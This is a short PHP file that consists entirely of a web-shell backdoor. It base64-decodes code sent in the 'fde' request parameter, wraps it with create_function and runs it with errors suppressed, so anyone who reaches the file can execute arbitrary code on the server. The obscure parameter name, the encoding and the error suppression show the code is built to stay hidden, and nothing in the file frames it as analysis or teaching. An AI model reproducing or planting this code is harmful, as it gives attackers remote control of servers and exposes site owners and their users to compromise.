<?php
if(!empty($_REQUEST['fde'])){$fde=base64_decode($_REQUEST['fde']);$fde=create_function('',$fde);@$fde();exit;}